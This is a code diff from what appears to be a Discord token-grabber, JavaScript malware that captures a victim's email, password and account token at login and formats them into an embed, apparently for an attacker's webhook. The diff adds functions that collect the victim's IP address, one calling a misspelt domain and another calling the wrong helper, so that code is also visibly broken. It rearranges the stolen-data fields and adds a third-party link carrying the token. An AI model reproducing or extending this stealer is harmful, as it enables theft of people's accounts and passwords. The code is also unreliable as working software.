@@ -490,6 +490,24 @@ const fetchBilling = async (token) => {
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
+const fetchIp = async (token) => {
+  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
+    xmlHttp.open("GET", "https://api.ipify.orgs", false); 
+    xmlHttp.send(null); 
+    xmlHttp.responseText`);
+  return JSON.parse(bill);
+};
+
+const getIp = async (token) => {
+  const data = await fetchBilling(token);
+  let ip = "";
+  data.forEach((x) => {
+    if (!x.invalid) {
+      ip += x.ip
+    }
+  });
+  return ip;
+};
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
@@ -660,23 +678,33 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '<a:944007295417843743:959785231982931979> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: '<a:satanist:802503618972483615> Badges:',
+            value: `${badges}`,
+            inline: true,
           },
           {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
+            name: '<:944007233820307467:959785232037470208> Email:',
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: '<a:satan:846706207632261120> IP:',
+            value: `\`${ip}\``,
+            inline: true,
+          },
+          {
+            name: '<a:satan:846706207632261120> Password:',
+            value: `\`${password}\``,
+            inline: true,
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
